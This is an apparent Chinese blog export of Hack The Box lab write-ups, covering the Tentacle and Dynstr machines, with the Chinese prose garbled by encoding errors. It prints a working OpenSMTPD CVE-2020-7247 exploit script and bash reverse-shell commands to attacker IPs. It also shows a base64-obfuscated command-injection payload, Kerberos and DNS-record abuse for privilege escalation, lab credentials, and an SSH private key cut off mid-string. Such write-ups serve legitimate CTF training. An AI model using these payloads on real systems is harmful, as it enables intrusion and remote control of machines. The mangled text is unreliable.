å­˜åœ¨è¿™ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”å¯ä»¥ä¸‹è½½\n\n![](Hackthebox-Tentacle/2a4517a2-7e62-45d5-a716-1204b7fbd61b.png)\n\nWPADåè®®åˆ†æåŠå†…ç½‘æ¸—é€åˆ©ç”¨\n\n[https://xz.aliyun.com/t/1739#toc-9](https://xz.aliyun.com/t/1739#toc-9)\n\nåœ¨æˆ‘è‡ªå·±æµ‹è¯•çš„æ—¶å€™ï¼Œç¬¬ä¸€ä¸ªæ®µ10.197.243.0/24è¿™ä¸ªIPæ®µï¼Œå’±ä»¬å¯ä»¥è·³è¿‡\n\nåœ¨æ‰«æç¬¬äºŒä¸ªIPæ®µ10.241.251.0/24çš„æ—¶å€™ï¼Œç»è¿‡äº†å¤§é‡çš„ä¿¡æ¯æœé›†ï¼Œå‘ç°10.241.251.113å¼€å¯äº†smtpç«¯å£ï¼Œå› ä¸ºæˆ‘å·²ç»åšè¿‡ä¸€æ¬¡äº†ï¼Œå°±ä¸åšé‡å¤ç”¨å·¥ï¼Œç›´æ¥æ‰«æ113è¿™å°æœºå™¨\n\nproxychains -f /etc/proxychains.conf nmap -sT -sV -Pn 10.241.251.113\n\n![](Hackthebox-Tentacle/e4c6f6ba-9d9a-446c-b965-476760d55caa.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ113è¿™å°æœºå™¨å¼€å¯äº†25ç«¯å£ï¼Œä¹Ÿå°±æ˜¯smtpæœåŠ¡\n\n**æ¼æ´åˆ©ç”¨**\n\nå¯ä»¥çœ‹åˆ°è¿™é‡Œä½¿ç”¨çš„æ˜¯OpenSMTPDï¼Œå’±ä»¬å»æœç´¢ä¸€ä¸‹ç›¸å…³çš„æ¼æ´\n\n![](Hackthebox-Tentacle/c6cab9b3-2a6d-4059-b495-6e8130ae7e81.png)\n\nå’±ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªCVE-2020-7247\n\n[https://www.exploit-db.com/exploits/47984](https://www.exploit-db.com/exploits/47984)\n\nå’±ä»¬ç®€å•ä¿®æ”¹ä¸€ä¸‹Exploit\n\n#!/usr/bin/env python3\n\nimport socket, time\n\nimport sys\n\nif len(sys.argv) < 4:\n\nprint(\"usage: exploit.py   \")\n\nexit()\n\nHOST = sys.argv\\[1\\]\n\nPORT = int(sys.argv\\[2\\])\n\nrev\\_shell\\_cmd = sys.argv\\[3\\]\n\npayload = b\"\"\"\\\\r\\\\n\n\n#0\\\\r\\\\n\n\n#1\\\\r\\\\n\n\n#2\\\\r\\\\n\n\n#3\\\\r\\\\n\n\n#4\\\\r\\\\n\n\n#5\\\\r\\\\n\n\n#6\\\\r\\\\n\n\n#7\\\\r\\\\n\n\n#8\\\\r\\\\n\n\n#9\\\\r\\\\n\n\n#a\\\\r\\\\n\n\n#b\\\\r\\\\n\n\n#c\\\\r\\\\n\n\n#d\\\\r\\\\n\n\n\"\"\" + rev\\_shell\\_cmd.encode() + b\"\"\"\n\n.\n\n\"\"\"\n\nfor res in socket.getaddrinfo(HOST, PORT, socket.AF\\_UNSPEC, socket.SOCK\\_STREAM):\n\naf, socktype, proto, canonname, sa = res\n\ntry:\n\ns = socket.socket(af, socktype, proto)\n\nexcept OSError as msg:\n\ns = None\n\ncontinue\n\ntry:\n\ns.connect(sa)\n\nexcept OSError as msg:\n\ns.close()\n\ns = None\n\ncontinue\n\nbreak\n\nif s is None:\n\nprint(\"Could not open socket\")\n\nsys.exit(1)\n\nwith s:\n\ndata = s.recv(1024)\n\nprint('Received', repr(data))\n\ntime.sleep(1)\n\nprint('SENDING HELO')\n\ns.send(b\"helo test.com\\\\r\\\\n\")\n\ndata = s.recv(1024)\n\nprint('RECIEVED', repr(data))\n\ns.send(b\"MAIL FROM:<;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;>\\\\r\\\\n\")\n\ntime.sleep(1)\n\ndata = s.recv(1024)\n\nprint('RECIEVED', repr(data))\n\ns.send(b\"RCPT TO:[j.nakazawa@realcorp.htb](mailto:&#106;&#46;&#x6e;&#x61;&#x6b;&#97;&#x7a;&#97;&#119;&#97;&#64;&#x72;&#101;&#97;&#x6c;&#x63;&#111;&#114;&#112;&#x2e;&#x68;&#x74;&#98;)\\\\r\\\\n\")\n\ndata = s.recv(1024)\n\nprint('RECIEVED', repr(data))\n\ns.send(b\"DATA\\\\r\\\\n\")\n\ndata = s.recv(1024)\n\nprint('RECIEVED', repr(data))\n\ns.send(payload)\n\ndata = s.recv(1024)\n\nprint('RECIEVED', repr(data))\n\ns.send(b\"QUIT\\\\r\\\\n\")\n\ndata = s.recv(1024)\n\nprint('RECIEVED', repr(data))\n\nprint(\"Exploited\")\n\ns.close()\n\nä¿å­˜ä¸ºexploit.pyåï¼Œæœ¬åœ°ä½¿ç”¨ncå¼€å¯ä¸€ä¸ªç«¯å£ç›‘å¬\n\nnc -nvlp 4444\n\nä½¿ç”¨proxychains4ä»£ç†è¿è¡Œè¯¥è„šæœ¬\n\nproxychains4 python3 expliot.py 10.241.251.113 25 'bash -c \"exec bash -i &> /dev/tcp/10.10.14.2/4444 <&1\"'\n\n![](Hackthebox-Tentacle/489f8aaa-cc10-4e70-a7dc-8878857a4cd1.png)\n\n![](Hackthebox-Tentacle/b469778a-3b26-4723-bef4-666884c670e0.png)\n\næˆåŠŸæ‹¿åˆ°ä¸€ä¸ªshellï¼Œå¹¶ä¸”ç›´æ¥å°±æ˜¯rootæƒé™\n\nä½†æ˜¯è¿™ä¸ªshellæ˜¯smtpçš„rootï¼Œå¹¶ä¸æ˜¯ç³»ç»Ÿçš„rootï¼Œå’±ä»¬è¿˜è¦æƒ³åŠæ³•ææƒ\n\n**æƒé™æå‡**\n\nå’±ä»¬è¿›å…¥/homeç›®å½•æŸ¥çœ‹ä¸€ä¸‹\n\n![](Hackthebox-Tentacle/a839f162-e579-4351-96ad-a9d5abe497b6.png)\n\næœ‰ä¸€ä¸ªj.nakazawaç›®å½•ï¼Œå’±ä»¬è¿›å»æ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰ç”¨çš„ä¸œè¥¿\n\n![](Hackthebox-Tentacle/961663a5-3718-47c3-8b05-bdf6e381f19e.png)\n\næˆ‘ä»¬åœ¨é‡Œé¢æ‰¾åˆ°ä¸€ä¸ª.msmtprcæ–‡ä»¶ï¼Œå’±ä»¬æŸ¥çœ‹ä¸€ä¸‹\n\n![](Hackthebox-Tentacle/e58abe5f-065d-479c-bfa5-64bd8c186ed4.png)\n\nå’±ä»¬å¾—åˆ°äº†ç”¨æˆ·j.nakazawaçš„è´¦å·å¯†ç \n\nUSERNAME = j.nakazawa\n\nPASSWORD = sJB}RM>6Z\\~64\\_\n\nä½†è¿™ä¸ªç”¨æˆ·æ— æ³•ç›´æ¥ç™»å½•sshï¼Œæ‰€ä»¥å’±ä»¬è¿˜å¾—æƒ³åŠæ³•æ¥åˆ©ç”¨\n\nå„ä½è¿˜è®°å¾—10.10.10.224è¿™å°æœºå™¨ä¸Š 3128ç«¯å£ä¸­å¦ä¸€ä¸ªçº¿ç´¢å—\n\n![](Hackthebox-Tentacle/04820eb4-c2c9-47ff-8d16-4c3eebe3ed2d.png)\n\næ²¡é”™ï¼Œå°±æ˜¯è¿™ä¸ªsrv01.realcorp.htbï¼Œå’±ä»¬å°†å®ƒåŠ å…¥åˆ°hostsé‡Œ\n\necho 10.10.10.224 srv01.realcorp.htb > /etc/hosts\n\nè®°å¾—ç¡®ä¿hostsæ–‡ä»¶ä¸­åªæœ‰è¿™ä¸€å°ä¸»æœºï¼Œè¾“å…¥ä¸Šé¢çš„æŒ‡ä»¤å³å¯\n\nç„¶åæˆ‘ä»¬ä½¿ç”¨kerbosç”Ÿæˆç¥¨æ®è¿›è¡Œç™»å½•\n\napt install krb5-user\n\nç„¶åå’±ä»¬ä¿®æ”¹å¯¹åº”é…ç½®\n\nvim /etc/krb5.conf\n\n\\[libdefaults\\]\n\ndefault\\_realm = REALCORP.HTB\n\n\\[realms\\]\n\nREALCORP.HTB = {\n\nkdc = 10.10.10.224\n\n}\n\n\\[domain\\_realm\\]\n\nsrv01.realcorp.htb = REALCORP.HTB\n\nåˆ†åˆ«å¡«å…¥å¯¹åº”ä½ç½®å³å¯\n\nç„¶åå’±ä»¬å»ç”Ÿæˆç¥¨æ®\n\nkinit j.nakazawa\n\npasswordï¼šsJB}RM>6Z\\~64\\_\n\nç„¶åå’±ä»¬æ£€æŸ¥ä¸€ä¸‹å¯ç”¨çš„ç¥¨æ®\n\nklist\n\n![](Hackthebox-Tentacle/2d11b659-8a6b-45ca-aaf3-27530c9b663a.png)\n\nOKï¼Œç¡®å®šç”ŸæˆæˆåŠŸ\n\nç„¶åå’±ä»¬ä½¿ç”¨sshè¿›è¡Œç™»å½•\n\nssh [j.nakazawa@10.10.10.224](mailto:j.nakazawa@10.10.10.224)\n\n![](Hackthebox-Tentacle/fa24d878-c942-4469-8805-34c5eb215627.png)\n\nç™»å½•æˆåŠŸ\n\n![](Hackthebox-Tentacle/683c49b0-2d3d-4086-9d7f-2db4cbd3cb89.png)\n\næˆåŠŸè·å¾—useræƒé™çš„flag\n\nå’±ä»¬æŸ¥çœ‹ä¸€ä¸‹/etc/crontab\n\n![](Hackthebox-Tentacle/10ed7528-f8dc-4b2a-8351-96346be8ff81.png)\n\nå®šæ—¶ä»»åŠ¡å‘ç°adminå®šæ—¶è¿è¡Œ/usr/local/bin/log\\_backup.sh\n\nå’±ä»¬æŸ¥çœ‹ä¸€ä¸‹\n\n![](Hackthebox-Tentacle/d547029f-56ef-422e-b63f-e0920be31771.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæ˜¯ä»squidç›®å½•å¤åˆ¶æ–‡ä»¶åˆ°adminç›®å½•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚æœå†™å…¥è®¤è¯æ–‡ä»¶åˆ°squidç›®å½•ï¼Œä»è€Œä½¿å…¶è¢«å¤åˆ¶åˆ°adminç›®å½•å‘¢ï¼Ÿè¯´å¹²å°±å¹²\n\nç°åœ¨åˆ›å»ºä¸€ä¸ªåä¸º.k5loginçš„æ–‡ä»¶ï¼Œå¹¶å¤åˆ¶åˆ°squidç›®å½•ä¸‹\n\necho \"j.nakazawa@REALCORP.HTB\" >> .k5login\n\ncp .k5login /var/log/squid\n\n![](Hackthebox-Tentacle/38c80d5a-d0f5-454f-a554-274352302f4a.png)\n\nç„¶åæˆ‘ä»¬ç¨ç­‰ä¸€ä¼šå„¿ä¹‹åï¼Œä½¿ç”¨adminçš„èº«ä»½æ¥è¿›è¡Œç™»å½•\n\n![](Hackthebox-Tentacle/18e4aaa7-102f-4550-af12-775efd3920d7.png)\n\nOKï¼ŒæˆåŠŸæ‹¿åˆ°adminæƒé™\n\nä½†æ˜¯æˆ‘å‘ç°ï¼Œæƒé™è¿˜æ˜¯ä¸å¤Ÿï¼Œå’±ä»¬è¿˜ä¸æ˜¯rootæƒé™ï¼Œè¿˜å¾—æã€‚ã€‚ã€‚\n\nå¥½å®¶ä¼™ï¼Œè¿™å¾—æä¸‰æ¬¡æƒä¹Ÿæ˜¯æ²¡è°äº†\n\nå’±ä»¬ä½¿ç”¨klistæŸ¥çœ‹ä¸€ä¸‹/etc/krb5.keytabè¿™ä¸ªæ–‡ä»¶\n\nklist -k /etc/krb5.keytab\n\n![](Hackthebox-Tentacle/883be589-23d8-4539-b49f-abef09b5a22a.png)\n\nå’±ä»¬å‘ç°äº†æœ‰å¾ˆå¤šä¸ªKerberosçš„åŠ å¯†å¯†é’¥\n\nå’±ä»¬ä½¿ç”¨kadminè¿›è¡Œåˆ©ç”¨\n\nkadmin -k -t /etc/krb5.keytab -p [kadmin/admin@REALCORP.HTB](mailto:kadmin/admin@REALCORP.HTB)\n\nadd\\_principal [root@REALCORP.HTB](mailto:root@REALCORP.HTB)\n\nç„¶åè‡ªå·±è®¾ç½®ä¸€ä¸ªå¯†ç å³å¯\n\n![](Hackthebox-Tentacle/6651e8aa-0c80-4af9-bca0-eb17ec9e3789.png)\n\nç„¶åä½¿ç”¨ksuåˆ‡æ¢åˆ°rootå³å¯\n\n![](Hackthebox-Tentacle/c63685cf-ead4-4116-be3c-89a3e526d1bc.png)\n\næˆåŠŸææƒåˆ°root\n\n![](Hackthebox-Tentacle/e165d589-0720-48ed-905e-359ccbf8f5f3.png)\n\næˆåŠŸæ‹¿åˆ°rootæƒé™çš„flag\n\næ”¶å·¥ç¡è§‰\n\nå“ï¼Œç›®å‰åœ¨çº¿çš„easyå’Œmediuméƒ½æ‰“å®Œäº†ï¼Œä»Šå¤©å¼€å§‹åªèƒ½æ‰“hardéš¾åº¦çš„äº†ï¼Œéš¾é¡¶å•Š","tags":["Hackthebox"]},{"title":"Dynstr - Hackthebox","url":"/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/","content":"\n# Hackthebox - Dynstr\n# **é¶åœºä¿¡æ¯**\n![](Hackthebox-Dynstr/74c4e226-e8ef-4632-8acc-76b854d3a473.png)\n\n# **é¶åœºç±»å‹**\n![](Hackthebox-Dynstr/ce370853-4356-447f-82da-9a1decf27ad4.png)\n\n# **ä¿¡æ¯æœé›†**\né¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ\n\n![](Hackthebox-Dynstr/611593bd-fe9b-4ba3-b723-15d1c9aae27b.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå¼€å¯äº†22 53 80ä¸‰ä¸ªç«¯å£ï¼Œè®©æˆ‘ä»¬è®¿é—®80ç«¯å£çœ‹çœ‹\n\n![](Hackthebox-Dynstr/f61b2fec-5251-4c3c-b153-5e90b4c38035.png)\n\nè®¿é—®åï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†ä¸‰ä¸ªåŸŸåï¼Œè€è§„çŸ©ï¼Œæ·»åŠ è¿›hosts\n\n```\necho \"10.10.10.244 dnsalias.htb dynamicdns.htb no-ip.htb dyna.htb dynstr.htb\" >> /etc/hosts\n```\n\næˆ‘è®¿é—®äº†ä¸€ä¸‹è¿™å‡ ä¸ªåŸŸåï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿ï¼Œé‚£å’±ä»¬åšä¸ªä¿¡æ¯æœé›†å§\n\nå°±æ‹¿æœ€çŸ­çš„dyna.htbå…¥æ‰‹å§\n\n```\nwfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u \"http://dyna.htb\" -H \"HOST: FUZZ.dyna.htb\"\n```\n\n![](Hackthebox-Dynstr/54e0542f-f8b8-4b3e-89f4-482232047e58.png)\n\nå’±ä»¬éœ€è¦è¿‡æ»¤æ‰10909ä¸ªå­—ç¬¦ åŠ ä¸Š--hh 10909\n\n![](Hackthebox-Dynstr/9371de2d-fa95-4fec-976c-07fcaca42532.png)\n\nå•Šè¿™ï¼Œç»“æœå•¥éƒ½æ²¡æ‰¾åˆ°ï¼Œé‚£åªèƒ½å»çœ‹çœ‹æœ‰æ²¡æœ‰å•¥å…¬å¼€æ¼æ´äº†å‘€\n\nISC BIND 9.16.1æœç´¢è¿™ä¸ªçš„æ¼æ´\n\n![](Hackthebox-Dynstr/e9ccc35e-c836-4cd0-b05e-7f9f0a601ce3.png)\n\næ‰¾åˆ°ä¸€ä¸ªç¼“å†²åŒºæº¢å‡ºï¼Œä½†æ˜¯å´æ²¡æœ‰åˆ©ç”¨çš„exploitï¼Œè¿™å°±å¾ˆéš¾å—äº†å‘€ã€‚æ²¡åŠæ³•ï¼Œç»§ç»­è¿”å›åšä¿¡æ¯æœé›†å§\n\nå’±ä»¬çˆ†ç ´ä¸€ä¸‹ç›®å½•å§\n\n```\ngobuster dir -u \"http://dyna.htb\" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n```\n\n![](Hackthebox-Dynstr/61226c9c-671e-40bc-9149-3cda16abfb6e.png)\n\nå‘ç°ä¸¤ä¸ªç›®å½• /assetsè¿™ä¸ªç›®å½•æ— æ³•è®¿é—® /nicè¿™ä¸ªç›®å½•æ˜¾ç¤ºç©ºç™½\n\nå’±ä»¬éœ€è¦è¿›ä¸€æ­¥fuzz\n\n![](Hackthebox-Dynstr/9ac4f110-c1d8-4e12-b01a-925e386ae92e.png)\n\n![](Hackthebox-Dynstr/79ef2b02-0fbd-4f61-beb3-06b9c2a4a051.png)\n\nå¾—åˆ°ä¸€ä¸ªbadauthï¼Œå†åŠ ä¸Šåœ¨ä¸»é¡µæ‰¾åˆ°çš„å‡­è¯\n\n```\nUsername: dynadns\nPassword: sndanyd\n```\n\nå’±ä»¬ä½¿ç”¨curlçš„-uåŠŸèƒ½è¿›è¡Œè®¿é—®\n\n![](Hackthebox-Dynstr/a4620477-1bd3-4fd4-88bf-ac84cfb33eb1.png)\n\n```\ncurl -u dynadns:sndanyd http://dyna.htb/nic/update\n```\n\n![](Hackthebox-Dynstr/bb82a6a6-57e8-44fa-9cba-acf7ecf27a4d.png)\n\nå¾—åˆ°äº†ä¸€ä¸ªçº¿ç´¢ï¼Œnochgï¼Œå’±ä»¬å»Googleä¸€ä¸‹è¿™æ˜¯å•¥ä¸œè¥¿\n\n![](Hackthebox-Dynstr/997cb903-565f-4c5e-9912-207d5f5e23e3.png)\n\n> [https://www.noip.com/integrate/response](https://www.noip.com/integrate/response)\n>\n> [https://help.dyn.com/remote-access-api/return-codes/](https://help.dyn.com/remote-access-api/return-codes/)\n\nè¿™å¯¼è‡´no-ip dynamic dnsçœ‹åˆ°ç›¸åº”ä»£ç \n\n![](Hackthebox-Dynstr/66c1a470-2be8-4764-bfe5-90b0a7144e0e.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°nochgå‘Šè¯‰æˆ‘ä»¬è¿˜æ²¡æœ‰æä¾›è¦æ›´æ–°çš„ä¸»æœºåï¼Œæ‰€ä»¥è®©æˆ‘ä»¬æ·±å…¥äº†è§£å¦‚ä½•æ›´æ–°dnsè®°å½•\n\n> [https://www.noip.com/integrate/request](https://www.noip.com/integrate/request)\n\n![](Hackthebox-Dynstr/35eae2e3-ffe3-461e-9af2-d9d661bd6788.png)\n\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ›´æ–°dnsè®°å½•ï¼Œä½†æ˜¯å®ƒéœ€è¦æœ‰æ•ˆ\n\nå’±ä»¬å…ˆä½¿ç”¨burpæ‹¦æˆªä¸€ä¸ªè¯·æ±‚\n\n# **æ¼æ´åˆ©ç”¨**\nè®¿é—®[http://dyna.htb/nic/update?hostname=dyna.htb&myip=10.10.14.197](http://dyna.htb/nic/update?hostname=dyna.htb&myip=10.10.14.197)\n\nç„¶ååœ¨è¯·æ±‚æš´åŠ›æ·»åŠ ä¸€ä¸ªæ ‡å¤´Authorization: Basic ZHluYWRuczpzbmRhbnlk\n\nè¿™ä¸ªæ ‡å¤´çš„base64é‡ŒåŒ…å«äº†è´¦å·å¯†ç \n\n![](Hackthebox-Dynstr/e4c7c010-f91c-489c-bad8-61a1b9b94589.png)\n\nä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸€ç›´æŠ¥é”™\n\nç»è¿‡å¤šæ¬¡å°è¯•åï¼Œè¦éšä¾¿åŠ ä¸€ä¸ªå¹¶ä¸å­˜åœ¨çš„å­åŸŸå\n\n![](Hackthebox-Dynstr/7f0931c4-1321-4f9d-be20-b5ee9945f474.png)\n\næˆäº†\n\n![](Hackthebox-Dynstr/b3c8a7df-7f86-41da-83ed-612584e063b8.png)\n\nå°è¯•äº†ä¸€ä¸‹å‘½ä»¤æ‰§è¡Œï¼Œæç¤ºæŠ¥é”™ï¼Œä½†å¯ä»¥ç¡®å®šæ˜¯å­˜åœ¨è¯¥æ¼æ´çš„\n\n[https://github.com/LucifielHack/command-injection-payload-list](https://github.com/LucifielHack/command-injection-payload-list)\n\nè¿™æ˜¯å‘½ä»¤æ‰§è¡Œçš„è¡¨ï¼Œå¤§ä¼™å„¿å¯ä»¥è‡ªä¸ªå„¿å»fuzzä¸€ä¸‹\n\n\\$(echo+id+|bash)\"è¿™æ˜¯æˆ‘æµ‹è¯•å‡ºæ¥çš„å‘½ä»¤æ‰§è¡Œæ ¼å¼\n\n![](Hackthebox-Dynstr/f145e86a-e985-4d21-8cc3-2267ee61f9b9.png)\n\nç°åœ¨å’±ä»¬è¦åå¼¹ä¸€ä¸ªshellå›å»\n\né¦–å…ˆæœ¬åœ°ç›‘å¬ä¸€ä¸ªç«¯å£\n\n```\nnc -nvlp 999\n```\n\nç„¶åæ„é€ åå¼¹çš„å‘½ä»¤\n\n```\n/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.197/999 0>&1'\n```\n\nç”±äºç›´æ¥æ”¾åˆ°burpé‡Œå»æ‰§è¡Œå¾ˆéº»çƒ¦ï¼Œæ‰€ä»¥å’±ä»¬å…ˆç»™ä»–è½¬ä¸ºbase64\n\n![](Hackthebox-Dynstr/3f956ea2-4d1f-4360-9103-18cd7b8ff18d.png)\n\nL2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE5Ny85OTkgMD4mMSc=ç„¶åä½¿ç”¨ç®¡é“åŠŸèƒ½è¿›è¡Œè§£ç ï¼Œç„¶åå†é€šè¿‡ç®¡é“ä¼ å›bash\n\n```\n/nic/update?hostname=\\$(echo+L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE5Ny85OTkgMD4mMSc=+|+base64+-d+|+bash)\"arz.no-ip.htb&myip=10.10.14.197\n```\n\næˆåŠŸå¼¹å›shell\n\n![](Hackthebox-Dynstr/7b5f6700-cf08-4294-aa7a-582584cc92ca.png)\n\n![](Hackthebox-Dynstr/bb2cff82-c1fd-4dd4-a0b8-af11727f276e.png)\n\nä½¿ç”¨python3è·å¾—ä¸€ä¸ªè¾ƒä¸ºç¨³å®šçš„shell\n\n![](Hackthebox-Dynstr/f2fbac0a-f6cf-4996-a391-e7f4e727749e.png)\n\nå’±ä»¬æŸ¥çœ‹äº†ä¸€ä¸‹passwdæ–‡ä»¶ï¼Œå‘ç°äº†æœ‰ä¸€ä¸ªbindmgrç”¨æˆ·ï¼ŒåŒæ—¶åœ¨/homeç›®å½•ä¸‹ä¹Ÿæœ‰ä»–çš„æ–‡ä»¶å¤¹\n\n![](Hackthebox-Dynstr/c3623c72-4088-481a-b782-a6b413bdb9d7.png)\n\nå’±ä»¬è¿›å»æŸ¥çœ‹ä¸€ä¸‹\n\n![](Hackthebox-Dynstr/2d351a21-77ce-4d3d-8922-77f9eee7b7ef.png)\n\nå’±ä»¬ä¼¼ä¹å‘ç°äº†ä¸€äº›æœ‰è¶£çš„ä¸œè¥¿\n\næˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹C62796521-debugging.script\n\næŸ¥çœ‹çš„åŒæ—¶ä¼šå‘ç°å†…å®¹æœ‰ç‚¹å¤šï¼Œå®¹æ˜“é€ æˆä¹±ç ã€‚å¤§å®¶çœ‹ä»”ç»†ç‚¹ï¼Œåæ­£æˆ‘æ˜¯çœ‹çš„è„‘ç“œå­ç–¼\n\n![](Hackthebox-Dynstr/ac6609e2-dd3a-45aa-9158-b15bda8b3f9e.png)\n\n![](Hackthebox-Dynstr/4120675e-6030-4c5f-a7bc-7d400ecc0586.png)\n\nå¤åˆ¶å‡ºæ¥åï¼Œç»è¿‡å¤„ç†ä¿å­˜åˆ°æœ¬åœ°ï¼ŒæˆåŠŸè·å¾—äº†ä¸€ä¸ªsshçš„å¯†é’¥ï¼Œå’±ä»¬å»ç™»å½•è¯•è¯•\n\n![](Hackthebox-Dynstr/64f36403-5ade-4204-ae77-6eb0ad961c6a.png)\n\nä½†æ˜¯è¿™è¿˜æ˜¯éœ€è¦å¯†ç ï¼Œè¿™æŒ‡å®šæ˜¯ä¸å¯¹å•Šï¼Œå’±ä»¬å†å»çœ‹çœ‹\n\n![](Hackthebox-Dynstr/11b2db77-d79f-414c-bb91-f345ebd622b4.png)\n\nå’±ä»¬æŸ¥çœ‹äº†ä¸€ä¸‹updateçš„æºä»£ç ï¼Œå¯ä»¥çœ‹åˆ°nsupdateä¸å¯†é’¥ä¸€èµ·ä½¿ç”¨/etc/bind/ddns.key\n\næ‰€ä»¥è¿™é‡Œè¦ä½¿ç”¨ä¸åŒçš„å¯†é’¥ï¼Œå’±ä»¬è¿›å…¥/etc/bind\n\n![](Hackthebox-Dynstr/32abac01-9935-498c-910d-eeb217673c4a.png)\n\nå’±ä»¬éœ€è¦è®²infra.keyæ·»åŠ åˆ°DNSè®°å½•\n\n```\nnsupdate -v -k /etc/bind/infra.key\nupdate add arz.infra.dyna.htb 86400 a 10.10.14.197\nsend\nshow\n```\n\n![](Hackthebox-Dynstr/f299635c-0368-451a-86d5-ed68ea551953.png)\n\nè¿™æ—¶å€™å¦‚æœæˆ‘ä»¬è¿è¡Œnslookupï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä¸ªå›å¤ï¼Œè¿™æ„å‘³ç€è¿™ä¸ªè®°å½•å·²ç»è¢«æ·»åŠ è¿›å»äº†\n\n![](Hackthebox-Dynstr/928c12bf-f634-4d8f-a1e4-639352a7f85e.png)\n\nä½†æ˜¯æˆ‘ä»¬ä»ç„¶æ— æ³•é€šè¿‡ ssh ç™»å½•ï¼Œå› ä¸º dns çš„ä½¿ç”¨å·²å¯ç”¨ï¼Œå› ä¸º ssh ä¼šè¿›è¡Œåå‘ dns æŸ¥æ‰¾è¿‡ç¨‹ï¼Œå› æ­¤åŸŸåæ­£åœ¨è§£æä¸º IPï¼Œä½† IP åœ°å€ä¸ä¼šè§£æä¸ºåŸŸåï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ·»åŠ PTRè®°å½•ä¸ºæ­¤ç›®çš„\n\nå’±ä»¬å»æ·»åŠ ä¸€ä¸ªAè®°å½•\n\n```\nnsupdate -k /etc/bind/infra.key\nupdate add anything.infra.dyna.htb 86400 A 10.10.14.197\n```\n\næ­¤è¡Œä¸ºç©ºæ ¼ ä¸‹ä¸€è¡Œçš„IPä¸ºD.C.B.Aæ ¼å¼ï¼Œä¹Ÿå°±æ˜¯æŠŠæˆ‘ä»¬çš„IPåè¿‡æ¥\n\n```\nupdate add 197.14.10.10.in-addr.arpa. 300 PTR anything.infra.dyna.htb\nsend\n```\n\n![](Hackthebox-Dynstr/b27e5025-86db-4d4a-b1d4-268ddad1d664.png)\n\nè¾“å…¥\n\n```\necho \"-----BEGIN OPENSSH PRIVATE KEY-----\\\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\\\\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\\\\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\\\\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\\\\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\\\\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\\\\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\\\\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\\\\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\\\\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\\\\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\\\\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\\\\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\\\\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\\\\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\\\\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\\\\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\\\\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\\\\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\\\\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\\\\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\\\\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxh